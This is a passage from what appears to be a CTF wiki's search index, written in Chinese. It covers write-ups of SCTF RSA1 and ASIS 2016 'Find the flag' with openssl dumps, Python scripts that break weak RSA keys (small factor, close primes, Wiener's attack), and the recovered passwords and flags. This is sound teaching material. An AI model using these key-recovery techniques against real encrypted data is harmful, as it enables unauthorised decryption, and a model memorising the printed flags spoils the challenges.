KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwyZZaeHtdNLgtJrVanwv\nKp7Dcf8TSxA3wG9WGTTFyx9twONXO0fEdj4ho7AREXjU7k/omSsVy8vXc+T5pigg\n/duM6hbtZ8JIEm5LAVNKZ8siIzs0Lq8T75NFFisAn+BL0ZDJLCeaNMM/1+5A9YJQ\nOaqM6cJ79DbjOJ0EUNuptz9LKtaKKlyHKut0NZhqnORSy5N40to5g/MM0WUeZpxA\nVgYNWPxBZF4G2oPQOwZCcNo4U+BUNVPO3nlKv/U75VN/bBgSZ6neN31EZV5oCng5\nPbsAIjUOo5TmlBUaPTnHUA6xZKUpo2lBQGmUsA0a6poSJ1DuHjoZtylwtG0enWE+\nfQIDAQAB\n-----END PUBLIC KEY-----\n\n\n\n\n\u4f3c\u4e4e\u8fd8\u662f\u4e0d\u662f\u5f88\u5927\uff0c\u518d\u6b21\u5206\u89e3\uff0c\u7136\u540e\u8bd5\u4e86 factordb \u4e0d\u884c\uff0c\u8bd5\u8bd5 yafu\u3002\u7ed3\u679c\u5206\u89e3\u51fa\u6765\u4e86\u3002\n\n\nP309\n \n=\n \n156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496383\n\n\n\nP309\n \n=\n \n156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496259\n\n\n\n\n\n\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u6570\u975e\u5e38\u76f8\u8fd1\uff0c\u53ef\u80fd\u662f factordb \u6ca1\u6709\u5b9e\u73b0\u8fd9\u7c7b\u5206\u89e3\u3002\n\n\n\u7ee7\u800c\u4e0b\u9762\u7684\u64cd\u4f5c\u7c7b\u4f3c\u4e8e level0\u3002\u53ea\u662f\u8fd9\u6b21\u662f\u76f4\u63a5\u89e3\u5bc6\u5c31\u597d\uff0c\u6ca1\u5565\u586b\u5145\uff0c\u8bd5\u4e86\u586b\u5145\u53cd\u800c\u9519\n\n\n\u5f97\u5230\u5bc6\u7801 \nfA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS\n\u3002\u7ee7\u7eed\u4e0b\u4e00\u6b65\uff0c\u67e5\u770b\u516c\u94a5\n\n\n\u279c  level2 git:\n(\nmaster\n)\n \u2717 openssl rsa -pubin -in public.key -text -modulus\nPublic-Key: \n(\n1025\n bit\n)\n\nModulus:\n    \n01\n:ba:0c:c2:45:b4:5c:e5:b5:f5:6c:d5:ca:a5:90:\n    c2:8d:12:3d:8a:6d:7f:b6:47:37:fb:7c:1f:5a:85:\n    8c:1e:35:13:8b:57:b2:21:4f:f4:b2:42:24:5f:33:\n    f7:2c:2c:0d:21:c2:4a:d4:c5:f5:09:94:c2:39:9d:\n    \n73\n:e5:04:a2:66:1d:9c:4b:99:d5:38:44:ab:13:d9:\n    cd:12:a4:d0:16:79:f0:ac:75:f9:a4:ea:a8:7c:32:\n    \n16\n:9a:17:d7:7d:80:fd:60:29:64:c7:ea:50:30:63:\n    \n76\n:59:c7:36:5e:98:d2:ea:5b:b3:3a:47:17:08:2d:\n    d5:24:7d:4f:a7:a1:f0:d5:73\nExponent:\n    \n01\n:00:8e:81:dd:a0:e3:19:28:e8:ee:51:11:08:c7:\n    \n50\n:5f:61:31:05:d2:e2:ff:9b:83:71:e4:29:c2:dd:\n    \n92\n:70:65:d4:09:6d:58:c3:76:31:07:f1:d4:fc:cf:\n    2d:b3:0a:6d:02:7c:56:61:7c:be:7e:0b:7e:d9:22:\n    \n28\n:66:9e:fb:3d:2f:2c:20:59:3c:21:ef:ff:31:00:\n    6a:fb:a7:68:de:4a:0a:4c:1a:a7:09:d5:48:98:c8:\n    1f:cf:fb:dd:f7:9c:ae:ae:0b:15:f4:b2:c7:e0:bc:\n    ba:31:4f:5e:07:83:ad:0e:7f:b9:82:a4:d2:01:fa:\n    \n68\n:29:6d:66:7c:cf:57:b9:4b\n\nModulus\n=\n1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQG6DMJFtFzltfVs1cqlkMKN\nEj2KbX+2Rzf7fB9ahYweNROLV7IhT/SyQiRfM/csLA0hwkrUxfUJlMI5nXPlBKJm\nHZxLmdU4RKsT2c0SpNAWefCsdfmk6qh8MhaaF9d9gP1gKWTH6lAwY3ZZxzZemNLq\nW7M6RxcILdUkfU+nofDVcwKBgQEAjoHdoOMZKOjuUREIx1BfYTEF0uL/m4Nx5CnC\n3ZJwZdQJbVjDdjEH8dT8zy2zCm0CfFZhfL5+C37ZIihmnvs9LywgWTwh7/8xAGr7\np2jeSgpMGqcJ1UiYyB/P+933nK6uCxX0ssfgvLoxT14Hg60Of7mCpNIB+mgpbWZ8\n\nz1e5Sw\n==\n\n-----END PUBLIC KEY-----\n\n\n\n\n\u53d1\u73b0\u79c1\u94a5 e \u548c n \u51e0\u4e4e\u4e00\u6837\u5927\uff0c\u8003\u8651 d \u6bd4\u8f83\u5c0f\uff0c\u4f7f\u7528 Wiener's Attack\u3002\u5f97\u5230 d\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u518d\u6b21\u9a8c\u8bc1\u4e00\u904d\u3002\n\n\n\u279c  level2 git:\n(\nmaster\n)\n \u2717 python RSAwienerHacker.py\nTesting Wiener Attack\nHacked!\n\n(\nhacked_d = \n, 29897859398360008828023114464512538800655735360280670512160838259524245332403L\n)\n\n-------------------------\nHacked!\n\n(\nhacked_d = \n, 29897859398360008828023114464512538800655735360280670512160838259524245332403L\n)\n\n-------------------------\nHacked!\n\n(\nhacked_d = \n, 29897859398360008828023114464512538800655735360280670512160838259524245332403L\n)\n\n-------------------------\nHacked!\n\n(\nhacked_d = \n, 29897859398360008828023114464512538800655735360280670512160838259524245332403L\n)\n\n-------------------------\nHacked!\n\n(\nhacked_d = \n, 29897859398360008828023114464512538800655735360280670512160838259524245332403L\n)\n\n-------------------------\n\n\n\n\n\u8fd9\u65f6\u6211\u4eec\u89e3\u5bc6\u5bc6\u6587\uff0c\u89e3\u5bc6\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \nCrypto.PublicKey\n \nimport\n \nRSA\n\n\nfrom\n \nCrypto.Cipher\n \nimport\n \nPKCS1_v1_5\n,\n \nPKCS1_OAEP\n\n\nimport\n \ngmpy2\n\n\nfrom\n \nbase64\n \nimport\n \nb64decode\n\n\nd\n \n=\n \n29897859398360008828023114464512538800655735360280670512160838259524245332403L\n\n\nwith\n \nopen\n(\n./public.key\n)\n \nas\n \nf\n:\n\n    \nkey\n \n=\n \nRSA\n.\nimportKey\n(\nf\n)\n\n    \nn\n \n=\n \nkey\n.\nn\n\n    \ne\n \n=\n \nkey\n.\ne\n\n\n\n\ndef\n \ngetprivatekey\n(\nn\n,\n \ne\n,\n \nd\n):\n\n    \npriviatekey\n \n=\n \nRSA\n.\nconstruct\n((\nlong\n(\nn\n),\n \nlong\n(\ne\n),\n \nlong\n(\nd\n)))\n\n    \nwith\n \nopen\n(\nprivate.pem\n,\n \nw\n)\n \nas\n \nf\n:\n\n        \nf\n.\nwrite\n(\npriviatekey\n.\nexportKey\n())\n\n\n\n\ndef\n \ndecrypt\n():\n\n    \nwith\n \nopen\n(\n./level3.passwd.enc\n)\n \nas\n \nf\n:\n\n        \ncipher\n \n=\n \nf\n.\nread\n()\n\n    \nwith\n \nopen\n(\n./private.pem\n)\n \nas\n \nf\n:\n\n        \nkey\n \n=\n \nRSA\n.\nimportKey\n(\nf\n)\n\n    \nprint\n \nkey\n.\ndecrypt\n(\ncipher\n)\n\n\n\n\ngetprivatekey\n(\nn\n,\n \ne\n,\n \nd\n)\n\n\ndecrypt\n()\n\n\n\n\n\n\u5229\u7528\u672b\u5c3e\u7684\u5b57\u7b26\u4e32 \nwIe6ER1s_1TtA3k_e_t00_larg3\n \u89e3\u5bc6\u538b\u7f29\u5305\uff0c\u6ce8\u610f\u53bb\u6389 B\u3002\u81f3\u6b64\u5168\u90e8\u89e3\u5bc6\u7ed3\u675f\uff0c\u5f97\u5230 flag\u3002", 
            "title": "\u7efc\u5408"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_complex/#2016-asis-find-the-flag", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 ASIS 2016 \u7ebf\u4e0a\u8d5b\u4e2d Find the flag \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002  \u6587\u4ef6\u89e3\u538b\u51fa\u6765\uff0c\u6709\u4e00\u4e2a\u5bc6\u6587\uff0c\u4e00\u4e2a\u516c\u94a5\uff0c\u4e00\u4e2a py \u811a\u672c\u3002\u770b\u4e00\u4e0b\u516c\u94a5\u3002  \u279c  RSA openssl rsa -pubin -in pubkey.pem -text -modulus\nPublic-Key:  ( 256  bit ) \nModulus:\n     00 :d8:e2:4c:12:b7:b9:9e:fe:0a:9b:c0:4a:6a:3d:\n    f5:8a:2a:94:42:69:b4:92:b7:37:6d:f1:29:02:3f:\n     20 :61:b9\nExponent:  12405943493775545863   ( 0xac2ac3e0ca0f5607 )  Modulus = D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9  \u8fd9\u4e48\u5c0f\u7684\u4e00\u4e2a  N N \uff0c\u5148\u5206\u89e3\u4e00\u4e0b\u3002  p = 311155972145869391293781528370734636009\nq = 315274063651866931016337573625089033553  \u518d\u770b\u7ed9\u7684 py \u811a\u672c\u3002  #!/usr/bin/python  import   gmpy  from   Crypto.Util.number   import   *  from   Crypto.PublicKey   import   RSA  from   Crypto.Cipher   import   PKCS1_v1_5  flag   =   open ( flag ,   r ) . read ()   *   30  def   ext_rsa_encrypt ( p ,   q ,   e ,   msg ): \n     m   =   bytes_to_long ( msg ) \n     while   True : \n         n   =   p   *   q \n         try : \n             phi   =   ( p   -   1 ) * ( q   -   1 ) \n             d   =   gmpy . invert ( e ,   phi ) \n             pubkey   =   RSA . construct (( long ( n ),   long ( e ))) \n             key   =   PKCS1_v1_5 . new ( pubkey ) \n             enc   =   key . encrypt ( msg ) . encode ( base64 ) \n             return   enc \n         except : \n             p   =   gmpy . next_prime ( p ** 2   +   q ** 2 ) \n             q   =   gmpy . next_prime ( 2 * p * q ) \n             e   =   gmpy . next_prime ( e ** 2 )  p   =   getPrime ( 128 )  q   =   getPrime ( 128 )  n   =   p * q  e   =   getPrime ( 64 )  pubkey   =   RSA . construct (( long ( n ),   long ( e )))  f   =   open ( pubkey.pem ,   w )  f . write ( pubkey . exportKey ())  g   =   open ( flag.enc ,   w )  g . write ( ext_rsa_encrypt ( p ,   q ,   e ,   flag ))   \u903b\u8f91\u5f88\u7b80\u5355\uff0c\u8bfb\u53d6 flag\uff0c\u91cd\u590d 30 \u904d\u4e3a\u5bc6\u6587\u3002\u968f\u673a\u53d6  p p  \u548c  q q \uff0c\u751f\u6210\u4e00\u4e2a\u516c\u94a5\uff0c\u5199\u5165  pubkey.pem \uff0c\u518d\u7528\u811a\u672c\u4e2d\u7684  ext_rsa_encrypt  \u51fd\u6570\u8fdb\u884c\u52a0\u5bc6\uff0c\u6700\u540e\u5c06\u5bc6\u6587\u5199\u5165  flag.enc \u3002  \u5c1d\u8bd5\u4e00\u4e0b\u89e3\u5bc6\uff0c\u63d0\u793a\u5bc6\u6587\u8fc7\u957f\uff0c\u518d\u770b\u52a0\u5bc6\u51fd\u6570\uff0c\u539f\u6765\u5f53\u52a0\u5bc6\u5931\u8d25\u65f6\uff0c\u51fd\u6570\u4f1a\u8df3\u5230\u5f02\u5e38\u5904\u7406\uff0c\u4ee5\u4e00\u5b9a\u7b97\u6cd5\u91cd\u65b0\u53d6\u66f4\u5927\u7684  p p  \u548c  q q \uff0c\u76f4\u5230\u52a0\u5bc6\u6210\u529f\u3002  \u90a3\u4e48\u6211\u4eec\u53ea\u8981\u4e5f\u5199\u4e00\u4e2a\u76f8\u5e94\u7684\u89e3\u5bc6\u51fd\u6570\u5373\u53ef\u3002  #!/usr/bin/python  import   gmpy  from   Crypto.Util.number   import   *  from   Crypto.PublicKey   import   RSA  from   Crypto.Cipher   import   PKCS1_v1_5  def   ext_rsa_decrypt ( p ,   q ,   e ,   msg ): \n     m   =   bytes_to_long ( msg ) \n     while   True : \n         n   =   p   *   q \n         try : \n             phi   =   ( p   -   1 ) * ( q   -   1 ) \n             d   =   gmpy . invert ( e ,   phi ) \n             privatekey   =   RSA . construct (( long ( n ),   long ( e ),   long ( d ),   long ( p ),   long ( q ))) \n             key   =   PKCS1_v1_5 . new ( privatekey ) \n             de_error   =   \n             enc   =   key . decrypt ( msg . decode ( base64 ),   de_error ) \n             return   enc \n         except   Exception   as   error : \n             print   error \n             p   =   gmpy . next_prime ( p ** 2   +   q ** 2 ) \n             q   =   gmpy . next_prime ( 2 * p * q ) \n             e   =   gmpy . next_prime ( e ** 2 )  p   =   311155972145869391293781528370734636009  q   =   315274063651866931016337573625089033553  n   =   p * q  e   =   12405943493775545863   # pubkey = RSA.construct((long(n), long(e)))  # f = open( pubkey.pem ,  w )  # f.write(pubkey.exportKey())  g   =   open ( flag.enc ,   r )  msg   =   g . read ()  flag   =   ext_rsa_decrypt ( p ,   q ,   e ,   msg )  print   flag   \u62ff\u5230 flag  ASIS{F4ct0R__N_by_it3rat!ng!}", 
            "title": "2016 ASIS Find the flag"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_complex/#sctf-rsa1", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA1 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u89e3\u538b\u538b\u7f29\u5305\u540e\uff0c\u5f97\u5230\u5982\u4e0b\u6587\u4ef6  \u279c  level0 git: ( master )  \u2717 ls -al\n\u603b\u7528\u91cf  4 \ndrwxrwxrwx  1  root root     0   7 \u6708   30   16 :36 .\ndrwxrwxrwx  1  root root     0   7 \u6708   30   16 :34 ..\n-rwxrwxrwx  1  root root   349   5 \u6708    2    2016  level1.passwd.enc\n-rwxrwxrwx  1  root root  2337   5 \u6708    6    2016  level1.zip\n-rwxrwxrwx  1  root root   451   5 \u6708    2    2016  public.key  \u5c1d\u8bd5\u89e3\u538b\u7f29\u4e86\u4e00\u4e0b level1.zip \u73b0\u9700\u8981\u5bc6\u7801\u3002\u7136\u540e\u6839\u636e level1.passwd.enc \u53ef\u77e5\uff0c\u5e94\u8be5\u662f\u6211\u4eec\u9700\u8981\u89e3\u5bc6\u8fd9\u4e2a\u6587\u4ef6\u624d\u80fd\u5f97\u5230\u5bf9\u5e94\u7684\u5bc6\u7801\u3002\u67e5\u770b\u516c\u94a5  \u279c  level0 git: ( master )  \u2717 openssl rsa -pubin -in public.key -text -modulus \nPublic-Key:  ( 2048  bit ) \nModulus:\n     00 :94:a0:3e:6e:0e:dc:f2:74:10:52:ef:1e:ea:a8:\n     89 :d6:f9:8d:01:11:51:db:5e:90:92:48:fd:39:0c:\n     70 :87:24:d8:98:3c:f3:33:1c:ba:c5:61:c2:ce:2c:\n    5a:f1:5e:65:b2:b2:46:91:56:b6:19:d5:d3:b2:a6:\n    bb:a3:7d:56:93:99:4d:7e:4c:2f:aa:60:7b:3e:c8:\n    fc:90:b2:00:62:4b:53:18:5b:a2:30:10:60:a8:21:\n    ab:61:57:d7:e7:cc:67:1b:4d:cd:66:4c:7d:f1:1a:\n    2a:1d:5e:50:80:c1:5e:45:12:3a:ba:4a:53:64:d8:\n     72 :1f:84:4a:ae:5c:55:02:e8:8e:56:4d:38:70:a5:\n     16 :36:d3:bc:14:3e:2f:ae:2f:31:58:ba:00:ab:ac:\n    c0:c5:ba:44:3c:29:70:56:01:6b:57:f5:d7:52:d7:\n     31 :56:0b:ab:0a:e6:8d:ad:08:22:a9:1f:cb:6e:49:\n    cc:01:4c:12:d2:ab:a3:a5:97:e5:10:49:19:7f:69:\n    d9:3b:c5:53:53:71:00:18:60:cc:69:1a:06:64:3b:\n     86 :94:70:a9:da:82:fc:54:6b:06:23:43:2d:b0:20:\n    eb:b6:1b:91:35:5e:53:a6:e5:d8:9a:84:bb:30:46:\n    b8:9f:63:bc:70:06:2d:59:d8:62:a5:fd:5c:ab:06:\n     68 :81\nExponent:  65537   ( 0x10001 )  Modulus = 94A03E6E0EDCF2741052EF1EEAA889D6F98D011151DB5E909248FD390C708724D8983CF3331CBAC561C2CE2C5AF15E65B2B2469156B619D5D3B2A6BBA37D5693994D7E4C2FAA607B3EC8FC90B200624B53185BA2301060A821AB6157D7E7CC671B4DCD664C7DF11A2A1D5E5080C15E45123ABA4A5364D8721F844AAE5C5502E88E564D3870A51636D3BC143E2FAE2F3158BA00ABACC0C5BA443C297056016B57F5D752D731560BAB0AE68DAD0822A91FCB6E49CC014C12D2ABA3A597E51049197F69D93BC5535371001860CC691A06643B869470A9DA82FC546B0623432DB020EBB61B91355E53A6E5D89A84BB3046B89F63BC70062D59D862A5FD5CAB066881\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlKA+bg7c8nQQUu8e6qiJ\n1vmNARFR216Qkkj9OQxwhyTYmDzzMxy6xWHCzixa8V5lsrJGkVa2GdXTsqa7o31W\nk5lNfkwvqmB7Psj8kLIAYktTGFuiMBBgqCGrYVfX58xnG03NZkx98RoqHV5QgMFe\nRRI6ukpTZNhyH4RKrlxVAuiOVk04cKUWNtO8FD4vri8xWLoAq6zAxbpEPClwVgFr\nV/XXUtcxVgurCuaNrQgiqR/LbknMAUwS0qujpZflEEkZf2nZO8VTU3EAGGDMaRoG\nZDuGlHCp2oL8VGsGI0MtsCDrthuRNV5TpuXYmoS7MEa4n2O8cAYtWdhipf1cqwZo\ngQIDAQAB\n-----END PUBLIC KEY-----  \u53d1\u73b0\u867d\u7136\u8bf4\u662f 2048 \u4f4d\uff0c\u4f46\u662f\u663e\u7136\u6a21\u6570\u6ca1\u6709\u90a3\u4e48\u957f\uff0c\u5c1d\u8bd5\u5206\u89e3\u4e0b\uff0c\u5f97\u5230  p=250527704258269\nq=74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349  \u7136\u540e\u5c31\u53ef\u4ee5\u6784\u9020\uff0c\u5e76\u4e14\u89e3\u5bc6\uff0c\u4ee3\u7801\u5982\u4e0b  from   Crypto.PublicKey   import   RSA  import   gmpy2  from   base64   import   b64decode  p   =   250527704258269  q   =   74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349  e   =   65537  n   =   p   *   q  def   getprivatekey ( n ,   e ,   p ,   q ): \n     phin   =   ( p   -   1 )   *   ( q   -   1 ) \n     d   =   gmpy2 . invert ( e ,   phin ) \n     priviatekey   =   RSA . construct (( long ( n ),   long ( e ),   long ( d ))) \n     with   open ( private.pem ,   w )   as   f : \n         f . write ( priviatekey . exportKey ())  def   decrypt (): \n     with   open ( ./level1.passwd.enc )   as   f : \n         cipher   =   f . read () \n     cipher   =   b64decode ( cipher ) \n     with   open ( ./private.pem )   as   f : \n         key   =   RSA . importKey ( f ) \n     print   key . decrypt ( cipher )  #getprivatekey(n, e, p, q)  decrypt ()   \u53d1\u73b0\u4e0d\u5bf9  \u279c  level0 git: ( master )  \u2717 python exp.py\n\u4e00\u5806\u4e71\u7801\u3002\u3002  \u8fd9\u65f6\u5019\u5c31\u8981\u8003\u8651\u5176\u4ed6\u60c5\u51b5\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u73b0\u5b9e\u4e2d\u5b9e\u73b0\u7684 RSA \u90fd\u4e0d\u4f1a\u76f4\u63a5\u7528\u539f\u751f\u7684 RSA\uff0c\u90fd\u4f1a\u52a0\u4e00\u4e9b\u586b\u5145\u6bd4\u5982 OAEP\uff0c\u6211\u4eec\u8fd9\u91cc\u8bd5\u8bd5\uff0c\u4fee\u6539\u4ee3\u7801  def decrypt1 () :\n    with open ( ./level1.passwd.enc )  as f:\n         cipher   =  f.read () \n     cipher   =  b64decode ( cipher ) \n    with open ( ./private.pem )  as f:\n         key   =  RSA.importKey ( f ) \n         key   =  PKCS1_OAEP.new ( key ) \n    print key.decrypt ( cipher )   \u679c\u7136\u5982\u6b64\uff0c\u5f97\u5230  \u279c  level0 git: ( master )  \u2717 python exp.py\nFaC5ori1ati0n_aTTA3k_p_tOO_sma11  \u5f97\u5230\u89e3\u538b\u5bc6\u7801\u3002\u7ee7\u7eed\uff0c\u67e5\u770b level1 \u4e2d\u7684\u516c\u94a5  \u279c  level1 git: ( master )  \u2717 openssl rsa -pubin -in public.key -text -modulus\nPublic-Key:  ( 2048  bit ) \nModulus:\n     00 :c3:26:59:69:e1:ed:74:d2:e0:b4:9a:d5:6a:7c:\n    2f:2a:9e:c3:71:ff:13:4b:10:37:c0:6f:56:19:34:\n    c5:cb:1f:6d:c0:e3:57:3b:47:c4:76:3e:21:a3:b0:\n     11 :11:78:d4:ee:4f:e8:99:2b:15:cb:cb:d7:73:e4:\n    f9:a6:28:20:fd:db:8c:ea:16:ed:67:c2:48:12:6e:\n    4b:01:53:4a:67:cb:22:23:3b:34:2e:af:13:ef:93:\n     45 :16:2b:00:9f:e0:4b:d1:90:c9:2c:27:9a:34:c3:\n    3f:d7:ee:40:f5:82:50:39:aa:8c:e9:c2:7b:f4:36:\n    e3:38:9d:04:50:db:a9:b7:3f:4b:2a:d6:8a:2a:5c:\n     87 :2a:eb:74:35:98:6a:9c:e4:52:cb:93:78:d2:da:\n     39 :83:f3:0c:d1:65:1e:66:9c:40:56:06:0d:58:fc:\n     41 :64:5e:06:da:83:d0:3b:06:42:70:da:38:53:e0:\n     54 :35:53:ce:de:79:4a:bf:f5:3b:e5:53:7f:6c:18:\n     12 :67:a9:de:37:7d:44:65:5e:68:0a:78:39:3d:bb:\n     00 :22:35:0e:a3:94:e6:94:15:1a:3d:39:c7:50:0e:\n    b1:64:a5:29:a3:69:41:40:69:94:b0:0d:1a:ea:9a:\n     12 :27:50:ee:1e:3a:19:b7:29:70:b4:6d:1e:9d:61:\n    3e:7d\nExponent:  65537   ( 0x10001 )  Modulus = C3265969E1ED74D2E0B49AD56A7C2F2A9EC371FF134B1037C06F561934C5CB1F6DC0E3573B47C4763E21A3B0111178D4EE4FE8992B15CBCBD773E4F9A62820FDDB8CEA16ED67C248126E4B01534A67CB22233B342EAF13EF9345162B009FE04BD190C92C279A34C33FD7EE40F5825039AA8CE9C27BF436E3389D0450DBA9B73F4B2AD68A2A5C872AEB7435986A9CE452CB9378D2DA3983F30CD1651E669C4056060D58FC41645E06DA83D03B064270DA3853E0543553CEDE794ABFF53BE5537F6C181267A9DE377D44655E680A78393DBB0022350EA394E694151A3D39C7500EB164A529A36941406994B00D1AEA9A122750EE1E3A19B72970B46D1E9D613E7D\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwyZZaeHtdNLgtJrVanwv\nKp7Dcf8TSxA3wG9WGTTFyx9twONXO0fEdj4ho7AREXjU7k/omSsVy8vXc+T5pigg\n/duM6hbtZ8JIEm5LAVNKZ8siIzs0Lq8T75NFFisAn+BL0ZDJLCeaNMM/1+5A9YJQ\nOaqM6cJ79DbjOJ0EUNuptz9LKtaKKlyHKut0NZhqnORSy5N40to5g/MM0WUeZpxA\nVgYNWPxBZF4G2oPQOwZCcNo4U+BUNVPO3nlKv/U75VN/bBgSZ6neN31EZV5oCng5\nPbsAIjUOo5TmlBUaPTnHUA6xZKUpo2lBQGmUsA0a6poSJ1DuHjoZtylwtG0enWE+\nfQIDAQAB\n-----END PUBLIC KEY-----  \u4f3c\u4e4e\u8fd8\u662f\u4e0d\u662f\u5f88\u5927\uff0c\u518d\u6b21\u5206\u89e3\uff0c\u7136\u540e\u8bd5\u4e86 factordb \u4e0d\u884c\uff0c\u8bd5\u8bd5 yafu\u3002\u7ed3\u679c\u5206\u89e3\u51fa\u6765\u4e86\uu53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u6570\u975e\u5e38\u76f8\u8fd1\uff0c\u53ef\u80fd\u662f factordb \u6ca1\u6709\u5b9e\u73b0\u8fd9\u7c7b\u5206\u89e3\u3002  \u7ee7\u800c\u4e0b\u9762\u7684\u64cd\u4f5c\u7c7b\u4f3c\u4e8e level0\u3002\u53ea\u662f\u8fd9\u6b21\u662f\u76f4\u63a5\u89e3\u5bc6\u5c31\u597d\uff0c\u6ca1\u5565\u586b\u5145\uff0c\u8bd5\u4e86\u586b\u5145\u53cd\u800c\u9519  \u5f97\u5230\u5bc6\u7801  fA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS \u3002\u7ee7\u7eed\u4e0b\u4e00\u6b65\uff0c\u67e5\u770b\u516c\u94a5  \u279c  level2 git: ( master )  \u2717 openssl rsa -pubin -in public.key -text -modulus\nPublic-Key:  ( 1025  bit ) \nModulus:\n     01 :ba:0c:c2:45:b4:5c:e5:b5:f5:6c:d5:ca:a5:90:\n    c2:8d:12:3d:8a:6d:7f:b6:47:37:fb:7c:1f:5a:85:\n    8c:1e:35:13:8b:57:b2:21:4f:f4:b2:42:24:5f:33:\n    f7:2c:2c:0d:21:c2:4a:d4:c5:f5:09:94:c2:39:9d:\n     73 :e5:04:a2:66:1d:9c:4b:99:d5:38:44:ab:13:d9:\n    cd:12:a4:d0:16:79:f0:ac:75:f9:a4:ea:a8:7c:32:\n     16 :9a:17:d7:7d:80:fd:60:29:64:c7:ea:50:30:63:\n     76 :59:c7:36:5e:98:d2:ea:5b:b3:3a:47:17:08:2d:\n    d5:24:7d:4f:a7:a1:f0:d5:73\nExponent:\n     01 :00:8e:81:dd:a0:e3:19:28:e8:ee:51:11:08:c7:\n     50 :5f:61:31:05:d2:e2:ff:9b:83:71:e4:29:c2:dd:\n     92 :70:65:d4:09:6d:58:c3:76:31:07:f1:d4:fc:cf:\n    2d:b3:0a:6d:02:7c:56:61:7c:be:7e:0b:7e:d9:22:\n     28 :66:9e:fb:3d:2f:2c:20:59:3c:21:ef:ff:31:00:\n    6a:fb:a7:68:de:4a:0a:4c:1a:a7:09:d5:48:98:c8:\n    1f:cf:fb:dd:f7:9c:ae:ae:0b:15:f4:b2:c7:e0:bc:\n    ba:31:4f:5e:07:83:ad:0e:7f:b9:82:a4:d2:01:fa:\n     68 :29:6d:66:7c:cf:57:b9:4b Modulus = 1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQG6DMJFtFzltfVs1cqlkMKN\nEj2KbX+2Rzf7fB9ahYweNROLV7IhT/SyQiRfM/csLA0hwkrUxfUJlMI5nXPlBKJm\nHZxLmdU4RKsT2c0SpNAWefCsdfmk6qh8MhaaF9d9gP1gKWTH6lAwY3ZZxzZemNLq\nW7M6RxcILdUkfU+nofDVcwKBgQEAjoHdoOMZKOjuUREIx1BfYTEF0uL/m4Nx5CnC\n3ZJwZdQJbVjDdjEH8dT8zy2zCm0CfFZhfL5+C37ZIihmnvs9LywgWTwh7/8xAGr7\np2jeSgpMGqcJ1UiYyB/P+933nK6uCxX0ssfgvLoxT14Hg60Of7mCpNIB+mgpbWZ8 z1e5Sw == \n-----END PUBLIC KEY-----  \u53d1\u73b0\u79c1\u94a5 e \u548c n \u51e0\u4e4e\u4e00\u6837\u5927\uff0c\u8003\u8651 d \u6bd4\u8f83\u5c0f\uff0c\u4f7f\u7528 Wiener's Attack\u3002\u5f97\u5230 d\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u518d\u6b21\u9a8c\u8bc1\u4e00\u904d\u3002  \u279c  level2 git: ( master )  \u2717 python RSAwienerHacker.py\nTesting Wiener Attack\nHacked! ( hacked_d =  , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) \n-------------------------\nHacked! ( hacked_d =  , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) \n-------------------------\nHacked! ( hacked_d =  , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) 